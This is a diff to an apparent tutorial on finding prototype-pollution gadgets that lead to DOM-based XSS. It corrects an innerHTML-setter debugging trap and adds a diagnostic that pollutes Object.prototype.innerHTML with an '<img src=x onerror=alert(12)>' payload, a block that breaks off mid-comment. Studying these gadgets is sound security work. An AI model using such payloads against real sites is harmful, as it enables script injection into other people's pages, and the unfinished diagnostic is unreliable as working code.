@@ -101,21 +101,48 @@ The gadget is the code that reads a property (like `innerHTML`) from an object w
 
 **Method A — Stack trace trap**
 
+Important: innerHTML is defined on Element.prototype, not HTMLElement.prototype. Using HTMLElement.prototype will throw Cannot read properties of undefined (reading 'set'). Use this corrected version:
+
 ```javascript
 // Set a trap on innerHTML property reads
-const origDesc = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'innerHTML');
-const origSet = origDesc.set;
+// CORRECTED TRAP — Uses Element.prototype instead of HTMLElement.prototype
+const desc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML')
+          || Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'innerHTML');
 
-Object.defineProperty(HTMLElement.prototype, 'innerHTML', {
-    set(value) {
-        if (typeof value === 'string' && value.includes('<img')) {
-            console.warn('[!] Malicious innerHTML being assigned!');
-            console.trace();
-            debugger;  // Execution pauses here — inspect the call stack
+if (desc && desc.set) {
+    const origSet = desc.set;
+    Object.defineProperty(Element.prototype, 'innerHTML', {
+        set(value) {
+            if (typeof value === 'string' && value.includes('<img')) {
+                console.warn('[!] Malicious innerHTML being assigned!');
+                console.trace();
+                debugger;  // Execution pauses here — inspect the call stack
+            }
+            return origSet.call(this, value);
         }
-        return origSet.call(this, value);
-    }
-});
+    });
+    console.log('✅ Trap set successfully on Element.prototype.innerHTML');
+} else {
+    console.error('❌ Could not find innerHTML descriptor. Trying fallback...');
+    
+    // Fallback: Trap on all existing elements
+    document.querySelectorAll('*').forEach(el => {
+        const elDesc = Object.getOwnPropertyDescriptor(el, 'innerHTML');
+        if (elDesc && elDesc.set) {
+            Object.defineProperty(el, 'innerHTML', {
+                set(value) {
+                    if (typeof value === 'string' && value.includes('<img')) {
+                        console.warn('[!] Malicious innerHTML being set on element:', el);
+                        console.trace();
+                        debugger;
+                    }
+                    return elDesc.set.call(this, value);
+                }
+            });
+        }
+    });
+    console.log('✅ Fallback trap set on existing elements');
+}
 ```
 
 Now pollute the prototype and interact with the page:
@@ -310,6 +337,21 @@ element.textContent = userInput;  // Safe by default
 ```
 
 ---
+
+# Debugging: Why Alert Might Not Fire
+Run this diagnostic:
+```js
+console.log('=== DIAGNOSTIC ===');
+
+// 1. Is pollution actually working?
+Object.prototype.innerHTML = "<img src=x onerror=alert(12)>";
+console.log('Pollution confirmed:', ({ }).innerHTML);
+
+// 2. Is the page using innerHTML somewhere?
+// Check if any DOM
+```
+
+
 
 ## Conclusion
 
